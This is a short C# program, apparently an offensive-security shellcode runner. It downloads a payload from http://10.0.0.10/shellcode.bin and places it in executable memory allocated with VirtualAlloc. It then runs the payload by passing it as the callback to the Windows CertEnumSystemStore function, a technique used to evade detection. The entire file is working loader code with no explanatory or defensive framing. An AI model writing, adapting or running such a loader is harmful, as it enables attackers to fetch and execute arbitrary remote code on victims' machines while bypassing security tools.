using System;
using System.Runtime.InteropServices;

class CertEnumSystemStoreRunner
{

    static void Main()
    {
        string url = "http://10.0.0.10/shellcode.bin";
        System.Net.WebClient client = new System.Net.WebClient();
        byte[] shellcode = client.DownloadData(url);

        IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        CertEnumSystemStore(CertSystemStoreFlags.CurrentUser, IntPtr.Zero, IntPtr.Zero, addr);
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

    [DllImport("Crypt32.dll", EntryPoint = "CertEnumSystemStore", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CertEnumSystemStore(CertSystemStoreFlags dwFlags, IntPtr pvSystemStoreLocationPara, IntPtr pvReserved, IntPtr pfnEnum);

    enum CertSystemStoreFlags : uint
    {
        CurrentUser = 0x00010000
    }
}
